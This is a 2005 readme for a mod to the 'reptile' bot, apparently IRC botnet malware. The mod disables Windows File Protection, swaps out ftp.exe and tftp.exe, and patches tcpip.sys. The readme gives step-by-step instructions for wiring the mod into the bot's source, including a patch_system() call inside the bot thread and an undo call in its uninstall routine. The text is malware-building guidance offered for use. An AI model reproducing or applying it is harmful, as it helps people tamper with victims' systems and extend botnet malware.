name:		wfp mod
purpose:	disables wfp, replaces ftp.exe and tftp.exe, patches tcpip.sys
date:		july 2005
author:		someone you probably don't know
credits:	wfp disable function posted on <removed site>
			original tcpip patch code from gnunet
			patch offsets found using lvllord's patcher
notes:		fuck you if you have reptile and shouldn't.

1: add to project:
	wfp.cpp/h
	replace.h

2: add to the bottom of includes.h
	#include "wfp.h"

3: add to reptile.cpp inside BotThread above #ifndef NO_AUTO_SECURE
	#ifndef NO_WFP
		patch_system();
	#endif

4: add to utility.cpp inside uninstall above ReleaseMutex(mutex);
	#ifndef NO_WFP
		patch_system(TRUE);
	#endif

5: add to defines.h
	//#define NO_WFP
